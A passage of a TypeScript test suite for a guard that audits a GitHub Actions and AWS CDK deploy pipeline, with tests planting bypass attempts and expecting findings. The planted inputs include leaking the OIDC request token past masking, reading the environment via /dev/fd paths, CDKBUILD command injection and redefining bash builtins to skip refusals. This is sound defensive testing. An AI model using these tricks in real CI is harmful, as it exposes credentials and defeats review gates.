    // up between the two leaves as it was.
    for (const restore of ['down', 'up']) {
      const read = plan({ STAGE: 'restore', RESTORE: restore })
      expect(read.output, restore).toBe(`basis=${BASIS}\n`)
      expect(read.calls, restore).toHaveLength(4)
      expect(
        read.calls.every(call => call.startsWith('cloudformation describe-stacks --stack-name Hearth-restore-')),
      ).toBe(true)
    }
  })

  it('goes on only while the stage reads as prod-plan read it, recorded or not', () => {
    expect(check({ BASIS }).status).toBe(0)
    expect(check({ BASIS, MODE: 'rollback' }).status).toBe(0)
    // The attack: another run's rollback put X back after prod-plan diffed C1, so Tasks and Services changed.
    const rolledBack = check({
      BASIS,
      STACK_Tasks: JSON.stringify(['UPDATE_COMPLETE', T2]),
      STACK_Services: JSON.stringify(['UPDATE_COMPLETE', T2]),
    })
    expect(rolledBack.status).toBe(1)
    expect(rolledBack.said).toContain('plan-basis: Hearth-prod changed since prod-plan diffed it')
    // The refusal names both ways on (round 11): prod-plan re-run alone refuses record-changed at prod-gate once
    // the run that moved the stage has recorded its release.
    expect(rolledBack.said).toContain(
      "re-run prod-plan, read its fresh diff and approve again, or, once a prod release has been recorded since this run's gate, re-run all jobs (while the commit is main's head) or dispatch afresh (deploy-and-rollback.md)",
    )
    const changes: ReadonlyArray<Record<string, string>> = [
      { BASIS: '' },
      { BASIS: BASIS.replace('Platform:', 'Platform:x') },
      { BASIS, STACK_Data: JSON.stringify(['UPDATE_ROLLBACK_COMPLETE', T1]) },
      { BASIS, STACK_Services: 'none' },
      { BASIS, STACK_Services: JSON.stringify(['UPDATE_IN_PROGRESS', T2]) },
    ]
    for (const env of changes) {
      expect(check(env).status, JSON.stringify(env)).toBe(1)
    }
    // A restore taken down is held the same way (round 11): an up after prod-plan's diff updates every restore
    // stack, each UPDATE_COMPLETE again, which down's own read by status alone took as unchanged.
    const down = { STAGE: 'restore', RESTORE: 'down' }
    expect(check({ ...down, BASIS }).status).toBe(0)
    const upSince = check({
      ...down,
      BASIS,
      STACK_Platform: JSON.stringify(['UPDATE_COMPLETE', T2]),
      STACK_Data: JSON.stringify(['UPDATE_COMPLETE', T2]),
      STACK_Tasks: JSON.stringify(['UPDATE_COMPLETE', T2]),
      STACK_Services: JSON.stringify(['UPDATE_COMPLETE', T2]),
    })
    expect(upSince.status).toBe(1)
    expect(upSince.said).toContain('plan-basis: Hearth-restore changed since prod-plan diffed it')
    expect(check({ ...down, BASIS: '' }).status).toBe(1)
  })

  it("is prod's What runs' first check, before anything is checked, pushed or deployed", () => {
    const text = whatRunsText('prod')
    expect(text).toContain(`${PLAN_BASIS}\nplan_basis check\nif [ "$TARGET" = restore ]; then`)
    const refused = run(text, {
      BASIS,
      TARGET: 'prod',
      RELEASE: `${'a'.repeat(40)}:sha256:${'0'.repeat(64)}`,
      STACK_Tasks: JSON.stringify(['UPDATE_COMPLETE', T2]),
    })
    expect(refused.status).toBe(1)
    expect(refused.output).toBe('')
    expect(refused.calls).toHaveLength(4)
    expect(
      refused.calls.every(call => call.startsWith('cloudformation describe-stacks --stack-name Hearth-prod-')),
    ).toBe(true)
    // prod-plan's Diff step reads the stage before either diff.
    const diff = PINNED_RUNS()['prod-plan']?.Diff?.run ?? ''
    expect(diff.indexOf('plan_basis plan\n')).toBeGreaterThan(diff.indexOf(PLAN_BASIS))
    expect(diff.indexOf('plan_basis plan\n')).toBeLessThan(diff.indexOf('if [ "$MODE" = rollback ]; then'))
  })
})

// Round 11, iteration 2: the CLI's line as an allowlist and the CDK_ variables its yargs reads as options; a #
// that bash reads as text inside (( … )) or a [[ … =~ ( … ) ]] group; a [[ that ends its line; a file read glued
// to a word, and /dev/fd spelt with . and .. between; this repository's own action by its full name, and an
// action's path that climbs out of its folder; and the required checks' names.
describe('Round 11, iteration 2: the ways past the allowlist (DPW-02, DPW-04, DPW-07, DPW-10)', () => {
  const at10 = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const canonical = (name: string, line: number, rule: string) => `${GUARD}: DPW-10 ${name}, line ${line}: ${rule}`
  const SHELL = (name: string) => `${GUARD}: DPW-10 ${name}: is written in the shell shellViews() reads`
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const CLI =
    'runs the CLI only as deploy or diff, with --app "$ASSEMBLY" (set once to the folder it downloaded), after CDK_FOLDER and no other change of folder, with --no-lookups --no-notices, a deploy with --require-approval never --ci --exclusively --no-previous-parameters and a diff with --method template, and no word but its stacks, one of the sets CLI_STACKS writes for its command (a deploy never every stack), and the flags the canonical lines write, so no short alias or other option the CLI reads'
  const CDK_ENV =
    "names no variable whose name starts with CDK, which the CDK CLI reads as the option the rest of its name spells (CDK_BUILD or CDKBUILD as --build, CDK_PLUGIN or CDKPLUGIN as --plugin), but the preamble's export of its telemetry and version check"
  const lineOf = (text: string, line: string) => text.split('\n').indexOf(line) + 1
  const token = ['ACTIONS', 'ID', 'TOKEN', 'REQUEST', 'TOKEN'].join('_')
  const spaced = `printf '%s\\n' "$${token}" | sed 's/./& /g'`

  // Round 11: the CLI's lines were held by a list of long option names, while its yargs reads each by its
  // short alias too, every CDK_ variable as the option of that name, and options the list never named: --build,
  // a shell command it runs with the job's environment before it reads --app, and on a diff --security-only,
  // which prints only the IAM changes. Every word after the subcommand is now one the canonical lines write.
  it('runs the CLI with no word but its stacks and the flags the canonical lines write (round 11)', () => {
    const forward = '--no-notices --ci --progress events\n'
    const step = 'nonprod (Deploy Platform, Data and Tasks)'
    for (const extra of [
      '-p /x/plugin.js',
      '-t Project=hearth',
      '-r x',
      '-O o.json',
      '-f',
      '-m direct',
      "--build 'npm run build'",
      '--build true',
      '--tags=Project=hearth',
      '--progress events',
      '"$STAGE/Platform"',
    ]) {
      const planted = plant(forward, `--no-notices --ci --progress events ${extra}\n`, job('nonprod'))
      expect(credentialedCodeFindings(planted, manifests, lockfile), extra).toContain(at10(step, CLI))
    }
    const diff = '"$STAGE/*" --method template'
    for (const extra of [
      '--security-only',
      '--template x.json',
      '--context-lines 0',
      '-q',
      "--build 'npm run build'",
    ]) {
      const planted = plant(diff, `${diff} ${extra}`, job('prod-plan'))
      expect(credentialedCodeFindings(planted, manifests, lockfile), extra).toContain(at10('prod-plan (Diff)', CLI))
    }
    // A diff with no --method template, which would make a change set.
    expect(credentialedCodeFindings(plant(diff, '"$STAGE/*"', job('prod-plan')), manifests, lockfile)).toContain(
      at10('prod-plan (Diff)', CLI),
    )
    // Every committed line passes as it is.
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  it('names no CDK_ variable in an env: or a credentialed run but the preamble’s two (round 11)', () => {
    const services = '      - name: Deploy Services\n'
    const env = `      - name: Deploy Services\n        env:\n          CDK_BUILD: npm run build\n`
    expect(credentialedCodeFindings(plant(services, env, job('nonprod')), manifests, lockfile)).toContain(
      at10('nonprod (Deploy Services)', CDK_ENV),
    )
    const jobEnv = `    env:\n      STAGE: nonprod\n`
    expect(
      credentialedCodeFindings(
        plant(jobEnv, `${jobEnv}      CDK_PLUGIN: /x/plugin.js\n`, job('nonprod')),
        manifests,
        lockfile,
      ),
    ).toContain(at10('nonprod', CDK_ENV))
    const exported = 'export CDK_DISABLE_CLI_TELEMETRY=true CDK_DISABLE_VERSION_CHECK=true\n'
    for (const line of [
      "export CDK_BUILD='npm run build'",
      'export cdk_plugin=/x/plugin.js',
      'declare -x CDK_BUILD=true',
    ]) {
      const planted = plant(exported, `${exported}          ${line}\n`, job('nonprod'))
      expect(credentialedCodeFindings(planted, manifests, lockfile), line).toContain(
        at10('nonprod (What runs)', CDK_ENV),
      )
    }
  })

  // Round 11: bash reads an arithmetic command's text up to )) as one string, and a [[ … =~ … ]] regex's
  // group as part of the regex, so a # in either is no comment, and what follows the )) or ]] on its line ran
  // while the code view blanked it. A # after an open (( or [[ is odd, so is any unquoted (( but $((, and a [[
  // after a case pattern's ) opens a test.
  it('reads a # inside (( … )) or a [[ … =~ ( … ) ]] group as bash does (round 11)', () => {
    const end =
      '  echo "aws-check: $mode passed: Hearth-$stage-Services is $status and runs $release" | mask | tee -a "$GITHUB_STEP_SUMMARY"\n}'
    expect(AWS_CHECK.endsWith(end)).toBe(true)
    const arith = AWS_CHECK.replace(end, end.replace('\n}', `\n  (( 0 #)) || ${spaced}\n}`))
    expect(canonicalTextFindings({ AWS_CHECK: arith })).toContain(SHELL('AWS_CHECK'))
    expect(shellViews(arith).odd.has('arithmetic')).toBe(true)
    expect(shellViews(arith).odd.has('comment')).toBe(true)
    const head =
      "  local mode=$1 stage=$STAGE out status release='' running='' digests=() td image tag pushed='' commit\n"
    expect(AWS_CHECK).toContain(head)
    const regex = AWS_CHECK.replace(
      head,
      `${head}  case "$mode" in\n    *)[[ "$mode" =~ ^( #) ]] || ${spaced}\n    ;;\n  esac\n`,
    )
    expect(canonicalTextFindings({ AWS_CHECK: regex })).toContain(SHELL('AWS_CHECK'))
    expect(canonicalTextFindings({ AWS_CHECK: regex })).toContain(
      canonical('AWS_CHECK', lineOf(regex, `    *)[[ "$mode" =~ ^( #) ]] || ${spaced}`), EVALUATES),
    )
    // A comment after a test or a $(( … )) that closed stays one, and so does a quoted (( or [[.
    for (const text of [
      'x=$1\nif [[ "$x" =~ ^(a|b)$ ]]; then echo ok; fi # a comment',
      'y=$((1 + 2)) # a comment',
      `echo '((' "[[" # a comment`,
    ]) {
      expect(shellViews(text).odd.size, text).toBe(0)
    }
  })

  // Round 11: a [[ at its line's end opens a test whose operands bash reads from the next line, where an
  // untrusted artifact id was compared as a number before its shape check.
  it('reads a [[ at its line’s end as a test that opens there (round 11)', () => {
    const from = '  if ! [[ "$1" =~ ^[1-9][0-9]{0,18}$ ]]; then'
    const to = '  if ! [[\n    true -lt "$1" ]] || ! [[ "$1" =~ ^[1-9][0-9]{0,18}$ ]]; then'
    expect(ARTIFACT_NAMES).toContain(from)
    const planted = ARTIFACT_NAMES.replace(from, to).replace('  local found\n', '  local found true=0\n')
    expect(evaluatedLines(planted)).toContain(lineOf(planted, '  if ! [[') - 1)
    expect(canonicalTextFindings({ ARTIFACT_NAMES: planted })).toContain(
      canonical('ARTIFACT_NAMES', lineOf(planted, '  if ! [['), EVALUATES),
    )
    expect(evaluatedLines('if [[\n  a == b ]]; then :; fi')).toEqual([0])
  })

  // Round 11: a < glued to the word before it is still a file read (x<file reads file), and /dev/fd spelt
  // with . and .. between its folders, or a path ending at environ, reaches the step's environment as /proc does.
  it('reads a file read glued to a word, and the environment however its path is spelt (round 11)', () => {
    const head =
      "  local mode=$1 stage=$STAGE out status release='' running='' digests=() td image tag pushed='' commit\n"
    for (const path of ['/dev/./fd/../environ', '/run/x', 'file']) {
      const added = `  listing=$(mask x<${path})`
      const planted = AWS_CHECK.replace(head, `${head}${added}\n  echo "$\{listing//?/& }"\n`)
      expect(canonicalTextFindings({ AWS_CHECK: planted }), path).toContain(
        canonical('AWS_CHECK', lineOf(planted, added), TOOLS),
      )
    }
    const MASKED =
      'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
    for (const path of ['/dev/./fd/../environ', '/dev//fd/0', '/dev/../dev/fd/3', '/x/environ']) {
      const planted = plant(head, `${head}          echo ${path}\n`, job('nonprod'))
      expect(maskingFindings(planted), path).toContain(`${DEPLOY}: DPW-07 nonprod (What runs): ${MASKED}`)
    }
  })

  // Round 11: a step that names this repository's own action by its full name, or by a path that
  // climbs out of another action's folder with . or .., ran an action.yml no rule reads (the runner keeps . and
  // .. and splits at \ too). The repository's own name, an action in any repository's .github folder and a .
  // or .. segment or a \ are refused, in every workflow.
  it('refuses this repository’s own action by its name, and a path that climbs (round 11)', () => {
    const REMOTE =
      "uses another repository's action, owner/repo@ref, never one of this repository's (./, .\\ or $/, or this repository by its name), whose action.yml no rule reads, an action in a repository's .github folder or a path that climbs out of its own (. or ..) or splits at \\, or a docker:// image"
    const audit = '      - uses: actions/checkout@v5\n'
    const own = 'an-owner/a-repo'
    for (const uses of [
      `${own}/.github/actions/setup@main`,
      `${own}/tools/setup@main`,
      'An-Owner/A-Repo/tools/setup@claude/x',
      'someone/else/.github/actions/x@v1',
      'actions/setup-node/../../checkout/v5@v5',
      'actions/setup-node/../../../../a-repo/a-repo/.github/actions/setup@v5',
      'owner/repo/./x@r',
      'owner/..@r',
      'owner/repo\\..\\x@r',
    ]) {
      expect(permissionFindings(plant(audit, `      - uses: ${uses}\n`, '  audit:\n', CI), own), uses).toContain(
        `${CI}: DPW-02 audit (step 1): ${REMOTE}`,
      )
    }
    for (const uses of ['actions/checkout@v5', 'github/codeql-action/init@v3', 'owner/repo/tools/x@main']) {
      expect(permissionFindings(plant(audit, `      - uses: ${uses}\n`, '  audit:\n', CI), own), uses).toEqual([])
    }
  })

  // Round 11: the gate's and prod-gate's reads of ci.yml's run, and the ruleset, find a job by its name, so a
  // stand-in named migrations that always succeeded passed for the real job named otherwise.
  it('names the required checks only by their ids (round 11)', () => {
    const RULE =
      "names check and migrations only by their ids: neither has a name:, and no other job's name: is either's, in any letter case, or an expression, since GitHub reports a job, and the ruleset, the gate and prod-gate read one, by its name"
    const finding = `${CI}: DPW-04 ${RULE}`
    const ci = readRepoFile(CI)
    const migrations = '  migrations:\n'
    expect(ci).toContain(migrations)
    expect(actionPinFindings(workflows)).not.toContain(finding)
    const standIn = '  migrations-report:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: "true"\n'
    for (const [from, to] of [
      [migrations, `${migrations}    name: migrations (Postgres 17)\n`],
      [migrations, `${standIn}    name: migrations\n${migrations}`],
      [migrations, `${standIn}    name: MIGRATIONS\n${migrations}`],
      [migrations, `${standIn}    name: \${{ 'migrations' }}\n${migrations}`],
      [migrations, `${standIn}    name: Check\n${migrations}`],
    ] as const) {
      expect(actionPinFindings(plant(from, to, '', CI)), to).toContain(finding)
    }
    expect(actionPinFindings(plant(migrations, `${standIn}    name: Report\n${migrations}`, '', CI))).not.toContain(
      finding,
    )
  })
})

// Round 11, iteration 3: which stacks each CLI line names, held to literal sets; the CDK variables the CLI's
// yargs reads with no underscore; an arithmetic-looking $(( that bash reads as a substitution holding a
// subshell, and <(( and >((; a function named after a builtin, a command or another text's function.
describe('Round 11, iteration 3: the ways past the allowlist (DPW-06, DPW-08, DPW-10)', () => {
  const at6 = (where: string, rule: string) => `${DEPLOY}: DPW-06 ${where}: ${rule}`
  const at10 = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const STEP_STACK =
    "names on each CLI line the stacks its step deploys or diffs, as CLI_STACKS writes them: Platform, Data and Tasks forward, then Services (the drill's too), a rollback's Tasks and Services, restore=down's one stack, and prod-plan's diff of every stack, the rollback's Tasks and Services or restore=down's one stack"
  const PROD_STACKS = `${DEPLOY}: DPW-08 prod: deploys only the stacks prod-plan's diff for its mode shows: a rollback's Tasks and Services as the rollback diff, restore=down's one stack as its diff, and a forward deploy's within the diff of every stack`
  const CLI =
    'runs the CLI only as deploy or diff, with --app "$ASSEMBLY" (set once to the folder it downloaded), after CDK_FOLDER and no other change of folder, with --no-lookups --no-notices, a deploy with --require-approval never --ci --exclusively --no-previous-parameters and a diff with --method template, and no word but its stacks, one of the sets CLI_STACKS writes for its command (a deploy never every stack), and the flags the canonical lines write, so no short alias or other option the CLI reads'
  const CDK_ENV =
    "names no variable whose name starts with CDK, which the CDK CLI reads as the option the rest of its name spells (CDK_BUILD or CDKBUILD as --build, CDK_PLUGIN or CDKPLUGIN as --plugin), but the preamble's export of its telemetry and version check"
  // Every copy of a canonical CLI line in deploy.yml changed together, as an author edits the guard's constant
  // and the workflow at once.
  const everywhere = (from: string, to: string) => {
    expect(deployText.includes(from), from).toBe(true)
    return withText(DEPLOY, deployText.replaceAll(from, to))
  }
  const stacksTo = (line: string, from: string, to: string) => {
    expect(line).toContain(from)
    return line.replace(from, to)
  }

  // Round 11: nothing held which stacks a CLI line deploys or diffs, so a rollback's line made "$STAGE/*" (the
  // selector prod-plan's own diff uses) deployed a target's Platform and Data under an approval whose diff showed
  // only Tasks and Services, and a forward line made "$STAGE/*" deployed Services before migrate.
  it('holds every CLI line to the stacks its step deploys or diffs (round 11)', () => {
    const rollbackAll = stacksTo(CDK_DEPLOY_ROLLBACK, '"$STAGE/Tasks" "$STAGE/Services"', '"$STAGE/*"')
    const planted = everywhere(CDK_DEPLOY_ROLLBACK, rollbackAll)
    for (const id of ['nonprod', 'prod', 'rollback-nonprod', 'rollback-prod']) {
      expect(deployStepFindings(planted), id).toContain(at6(id, STEP_STACK))
    }
    expect(credentialedCodeFindings(planted, manifests, lockfile)).toContain(
      at10('prod (Roll back to the target)', CLI),
    )
    expect(credentialedCodeFindings(planted, manifests, lockfile)).toContain(
      at10('rollback-prod (Roll back Tasks and Services)', CLI),
    )
    const forwardAll = stacksTo(CDK_DEPLOY_FORWARD, '"$STAGE/Platform" "$STAGE/Data" "$STAGE/Tasks"', '"$STAGE/*"')
    const forward = everywhere(CDK_DEPLOY_FORWARD, forwardAll)
    expect(deployStepFindings(forward)).toContain(at6('prod', STEP_STACK))
    expect(credentialedCodeFindings(forward, manifests, lockfile)).toContain(
      at10('prod (Deploy Platform, Data and Tasks)', CLI),
    )
    // A set CLI_STACKS writes, on a step that deploys another: Tasks and Services where Platform, Data and
    // Tasks deploy, before migrate.
    const swapped = everywhere(
      CDK_DEPLOY_FORWARD,
      stacksTo(
        CDK_DEPLOY_FORWARD,
        '"$STAGE/Platform" "$STAGE/Data" "$STAGE/Tasks"',
        '"$STAGE/Tasks" "$STAGE/Services"',
      ),
    )
    expect(deployStepFindings(swapped)).toContain(at6('nonprod', STEP_STACK))
    expect(deployStepFindings(swapped)).toContain(at6('prod', STEP_STACK))
    // The rollback's diff narrowed to Services while its deploy stays Tasks and Services.
    const narrowed = everywhere(
      CDK_DIFF_ROLLBACK,
      stacksTo(CDK_DIFF_ROLLBACK, '"$STAGE/Tasks" "$STAGE/Services"', '"$STAGE/Services"'),
    )
    expect(deployStepFindings(narrowed)).toContain(at6('prod-plan', STEP_STACK))
    expect(credentialedCodeFindings(narrowed, manifests, lockfile)).toContain(
      at10('prod-plan (Diff the rollback)', CLI),
    )
    // Every committed line passes as it is.
    expect(deployStepFindings(workflows)).toEqual([])
  })

  it("deploys in prod only the stacks prod-plan's diff for its mode names (round 11)", () => {
    expect(prodDiffStackFindings()).toEqual([])
    expect(prodPathFindings(workflows)).not.toContain(PROD_STACKS)
    expect(cliStacksOf(CDK_DEPLOY_ROLLBACK)).toEqual({ command: 'deploy', stacks: ['Tasks', 'Services'] })
    expect(cliStacksOf(CDK_DIFF_PROD)).toEqual({ command: 'diff', stacks: ['*'] })
    for (const [name, line] of [
      ['CDK_DEPLOY_ROLLBACK', stacksTo(CDK_DEPLOY_ROLLBACK, '"$STAGE/Tasks" "$STAGE/Services"', '"$STAGE/*"')],
      ['CDK_DIFF_ROLLBACK', stacksTo(CDK_DIFF_ROLLBACK, '"$STAGE/Tasks" "$STAGE/Services"', '"$STAGE/Services"')],
      [
        'CDK_DEPLOY_FORWARD',
        stacksTo(CDK_DEPLOY_FORWARD, '"$STAGE/Platform" "$STAGE/Data" "$STAGE/Tasks"', '"$STAGE/*"'),
      ],
      ['CDK_DEPLOY_SERVICES', stacksTo(CDK_DEPLOY_SERVICES, '"$STAGE/Services"', '"$STAGE/Data" "$STAGE/Services"')],
      ['CDK_DIFF_PROD', stacksTo(CDK_DIFF_PROD, '"$STAGE/*"', '"$STAGE/Tasks" "$STAGE/Services"')],
      ['CDK_DEPLOY_DOWN', stacksTo(CDK_DEPLOY_DOWN, '"$STAGE/$PART"', '"$STAGE/*"')],
      ['CDK_DIFF_DOWN', stacksTo(CDK_DIFF_DOWN, '"$STAGE/$PART"', '"$STAGE/Services"')],
    ] as const) {
      expect(prodDiffStackFindings({ [name]: line }), name).toEqual([PROD_STACKS])
    }
  })

  // Round 11: the CLI's yargs takes every variable whose name starts with CDK, underscore or not, so CDKBUILD
  // ran a shell command as --build and CDKPLUGIN loaded a module as --plugin past a rule that read CDK_ alone.
  it('names no variable whose name starts with CDK, underscore or not (round 11)', () => {
    const services = '      - name: Deploy Services\n'
    for (const name of ['CDKBUILD', 'CDKPLUGIN', 'CDKroleArn', 'CDK_BUILD', 'cdkBuild']) {
      const env = `      - name: Deploy Services\n        env:\n          ${name}: echo built\n`
      expect(credentialedCodeFindings(plant(services, env, job('nonprod')), manifests, lockfile), name).toContain(
        at10('nonprod (Deploy Services)', CDK_ENV),
      )
    }
    const jobEnv = `    env:\n      STAGE: nonprod\n`
    expect(
      credentialedCodeFindings(
        plant(jobEnv, `${jobEnv}      CDKPLUGIN: /x/plugin.js\n`, job('nonprod')),
        manifests,
        lockfile,
      ),
    ).toContain(at10('nonprod', CDK_ENV))
    const exported = 'export CDK_DISABLE_CLI_TELEMETRY=true CDK_DISABLE_VERSION_CHECK=true\n'
    for (const line of [
      "export CDKBUILD='npm run build'",
      'declare -x CDKPLUGIN=/x/plugin.js',
      `: "\${CDKBUILD:=x}"`,
    ]) {
      const planted = plant(exported, `${exported}          ${line}\n`, job('nonprod'))
      expect(credentialedCodeFindings(planted, manifests, lockfile), line).toContain(
        at10('nonprod (What runs)', CDK_ENV),
      )
    }
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  // Round 11: bash reads $((set) ) as a command substitution holding a subshell (its inner ( closes with a ) not
  // straight before the frame's own), and <((set) ) and >((set) ) likewise, while the reader took each for
  // arithmetic, so a set listing every variable, the OIDC request token among them, ran unread once the text
  // declared set with local.
  it('reads $(( … ) ), <(( and >(( as bash does (round 11)', () => {
    const SHELL = `${GUARD}: DPW-10 AWS_CHECK: is written in the shell shellViews() reads`
    const go = `  echo 'go=true' >>"$GITHUB_OUTPUT"\n`
    expect(AWS_CHECK).toContain(go)
    for (const [names, line] of [
      ['set listing', 'listing=$((set) )'],
      ['set listing', 'listing="$((set) )"'],
      ['set lines', 'mapfile -t lines < <((set) )'],
      ['set listing', 'listing=$((set)\n)'],
    ] as const) {
      const planted = AWS_CHECK.replace(go, `  local ${names}\n  ${line}\n${go}`)
      expect(shellViews(planted).odd.has('arithmetic'), line).toBe(true)
      expect(canonicalTextFindings({ AWS_CHECK: planted }), line).toContain(SHELL)
    }
    for (const text of ['x=$((set) )', 'echo "$((set) )"', 'cat <((set) )', 'tee >((set) )', 'x=$((1)']) {
      expect(shellViews(text).odd.has('arithmetic'), text).toBe(true)
    }
    // An arithmetic expansion bash reads as one stays plain, with parentheses inside or not.
    for (const text of ['x=$((1 + 2))', 'x=$(( (a + b) * 2 ))', 'echo "$(( (a) ))"', 'x=$( (cd /tmp) )']) {
      expect(shellViews(text).odd.has('arithmetic'), text).toBe(false)
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // Round 11: a canonical text could define a function named after a builtin, and outside POSIX mode bash finds a
  // function before a builtin, so exit() { :; } made every later exit 1 (each aws_refuse and asset_refuse) carry on.
  it('defines a function only by a plain name of its own, once (round 11)', () => {
    const RULE =
      "defines a function only by a plain lower-case name of its own, once: never a builtin's or keyword's (bash finds a function before a builtin, exit and return among them), one bash itself calls (command_not_found_handle), a command's a text or a run runs, or one another canonical text defines"
    const anchor = 'is_ancestor() { git merge-base --is-ancestor "$1" "$2" 2>/dev/null; }\n'
    expect(AWS_CHECK).toContain(anchor)
    const lineAfter = AWS_CHECK.slice(0, AWS_CHECK.indexOf(anchor) + anchor.length).split('\n').length
    for (const definition of [
      'exit() { :; }',
      'return() { :; }',
      'function local { :; }',
      'printf() { :; }',
      'set() { :; }',
      'jq() { :; }',
      'cat() { :; }',
      'head() { :; }',
      'record() { :; }',
      'mask() { :; }',
      'asset_refuse() { :; }',
      'is_ancestor() { :; }',
      'Exit() { :; }',
      'x.y() { :; }',
      // Round 12's second iteration: bash runs this one for any command it can't find, and takes its status.
      'command_not_found_handle() { return 0; }',
      'function command_not_found_handle { :; }',
    ]) {
      const planted = AWS_CHECK.replace(anchor, `${anchor}${definition}\n`)
      expect(canonicalTextFindings({ AWS_CHECK: planted }), definition).toContain(
        `${GUARD}: DPW-10 AWS_CHECK, line ${lineAfter}: ${RULE}`,
      )
    }
    // A plain name of its own passes this rule.
    const own = AWS_CHECK.replace(anchor, `${anchor}stage_name() { :; }\n`)
    expect(functionNameLines(own, { AWS_CHECK: own })).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })
})

// Round 12, iteration 1: the gaps the finders proved past the guard's reader and rules, each planted as they
// planted it and found at its root.
describe('Round 12, iteration 1: the ways past the reader and the rules (DPW-02, DPW-10)', () => {
  const PROCESS_TOOL =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const anchor = "  local step=$1 PART answer status basis=''\n"
  const lineAfter = (text: string, at: string) => text.slice(0, text.indexOf(at) + at.length).split('\n').length
  const plantedBasis = (at: string, added: string) => {
    expect(PLAN_BASIS).toContain(at)
    return PLAN_BASIS.replace(at, `${at}${added}`)
  }
  const grep = 'grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2'

  // EXPAND-G1-01: bash runs a process substitution in a [[ … ]] operand and in a case pattern, which the code
  // view blanked but for a $( … ), so its program was read by no rule.
  it('reads a process substitution in a test’s operand or a case pattern as the command it runs (EXPAND-G1-01)', () => {
    const line = lineAfter(PLAN_BASIS, anchor)
    for (const [planted, at] of [
      [plantedBasis(anchor, `  [[ -e <(${grep}) ]]\n`), line],
      [plantedBasis(anchor, `  [[ -e >(${grep}) ]]\n`), line],
      [plantedBasis(anchor, `  case "$step" in\n    *<(${grep})*) ;;\n  esac\n`), line + 1],
    ] as const) {
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), planted).toContain(
        `${GUARD}: DPW-10 PLAN_BASIS, line ${at}: ${PROCESS_TOOL}`,
      )
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // EXPAND-G1-02: the case scanner found an item's end and a pattern's ) by counting in the code view, which read
  // neither a backslash's escape nor a ${ … } as bash does, so a ;; or ( in a parameter expansion, or a \(, had
  // it blank the item's commands: a tool, exit 0 or a redefinition of AWS_CHECK's refusal.
  it('refuses a ;, ( or ) in a parameter expansion and an escaped parenthesis (EXPAND-G1-02)', () => {
    const SHELL = `${GUARD}: DPW-10 PLAN_BASIS: is written in the shell shellViews() reads`
    const item = '      echo "basis=$basis" >>"$GITHUB_OUTPUT"\n'
    for (const planted of [
      plantedBasis(item, `      basis=\${basis//;;/,}; ${grep}\n`),
      plantedBasis(anchor, `  case "$step" in\n    \${step/(/}) ${grep} ;;\n  esac\n`),
      plantedBasis(anchor, `  case "$step" in\n    \${step/)/}) ${grep} ;;\n  esac\n`),
      plantedBasis(
        anchor,
        '  case "$step" in\n    \\(|*) aws_refuse() { echo "aws-check: $1, and so on"; } ;;\n    x) ;;\n  esac\n',
      ),
      plantedBasis(anchor, `  case "$step" in\n    \\)|*) exit 0 ;;\n  esac\n`),
      plantedBasis(anchor, `  echo "\${step//;/,}"\n`),
    ]) {
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), planted).toContain(SHELL)
    }
  })

  // COMMANDS-G1-02: jq runs its program on each value it reads and -e reads the last output alone, so a jq -e fed
  // a stream, jq -c '.[]' <<<"$X" | jq -e 'f', holds the last value alone, though its program prints one value.
  it('refuses a jq -e fed by a pipe unless it is given -n or -s (COMMANDS-G1-02)', () => {
    const RULE =
      "hands jq -e no stream of values: it reads one file or a here-string on its own command, unless it is given -n or -s, and never its standard input otherwise (a pipe, a group, a function's caller, < <( … )) or more than one file, since -e reads the last value it reads alone"
    const shape = 'all(.[]; type == "string" and test("^[0-9]{1,3}([.][0-9]{1,3}){3}$"))'
    const probeLine = PROBE.split('\n').find(each => each.includes(shape)) ?? ''
    expect(probeLine).toContain(`'length == $n and ${shape}' <<<"$ADDRESSES" >/dev/null`)
    const streamed = PROBE.replace(
      probeLine,
      probeLine.replace(
        `'length == $n and ${shape}' <<<"$ADDRESSES" >/dev/null`,
        `'length == $n' <<<"$ADDRESSES" >/dev/null || ! jq -c '.[]' <<<"$ADDRESSES" | jq -e 'type == "string" and test("^[0-9]{1,3}([.][0-9]{1,3}){3}$")' >/dev/null`,
      ),
    )
    expect(streamed).not.toBe(PROBE)
    const line = PROBE.split('\n').indexOf(probeLine) + 1
    expect(canonicalTextFindings({ PROBE: streamed })).toContain(`${GUARD}: DPW-10 PROBE, line ${line}: ${RULE}`)
    for (const [text, lines] of [
      [`jq -c '.[]' <<<"$X" | jq -e 'type == "string"' >/dev/null`, [0]],
      [`jq -c '.[]' <<<"$X" |& jq -ce '. == 1'`, [0]],
      [`jq -c '.[]' <<<"$X" |\n  jq -e '. == 1'`, [1]],
      [`jq -c '.[]' <<<"$X" | { jq -e '. == 1'; }`, [0]],
      [`jq -c '.[]' <<<"$X" | jq -se 'all(.[]; . == 1)'`, []],
      [`jq -c '.[]' <<<"$X" | jq -ne 'true'`, []],
      [`jq -e '. == 1' <<<"$X" || true`, []],
      [`jq -c '.[]' <<<"$X" | jq -c '. == 1'`, []],
    ] as const) {
      expect(jqPipedLines(text), text).toEqual(lines)
    }
    // A run's own line, as the glue reads it, is held the same way.
    const glue = (added: string) =>
      credentialedCodeFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${added}\n`),
        manifests,
        lockfile,
      ).join('\n')
